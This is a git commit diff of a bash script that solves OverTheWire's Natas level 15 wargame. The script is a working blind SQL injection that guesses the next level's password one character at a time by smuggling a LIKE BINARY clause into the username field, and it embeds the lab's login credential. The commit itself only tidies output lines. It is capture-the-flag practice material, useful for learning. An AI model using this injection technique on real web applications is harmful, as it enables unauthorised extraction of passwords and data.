40d6698a808ef0c202f0809362ee129f8a7e750b
Mahmoud Fathi <m.fathi1991@gmail.com>
2021-01-16 01:05:05 +0100

    Remove the superfluous lines.

--- natas15.sh
+++ natas15.sh
@@ -2,7 +2,6 @@
 
 CHARACHTERS="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 PASSWORD=""
-
 for ((i=0 ; i < 32 ; i++)); do
     for ((j=0; j<${#CHARACHTERS}; j++)); do
         CHAR="${CHARACHTERS:${j}:1}"
@@ -11,13 +10,11 @@ for ((i=0 ; i < 32 ; i++)); do
                         --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
                         --data "username=natas16\" AND password LIKE BINARY \"${PASSWORD}${CHAR}%\" #" \
                         http://natas15.natas.labs.overthewire.org/index.php)
-        #printf "${RESPONSE}"
         if [[ ${RESPONSE} == *"This user exists."* ]]; then
             PASSWORD=${PASSWORD}${CHAR}
-            printf "\n"
-            printf "Found charachter(s): ${PASSWORD}\n"
+            printf "\nFound charachter(s): ${PASSWORD}\n"
             break
         fi
     done
 done
-printf "Password is: ${PASSWORD}\n"
+printf "The password is: ${PASSWORD}\n"
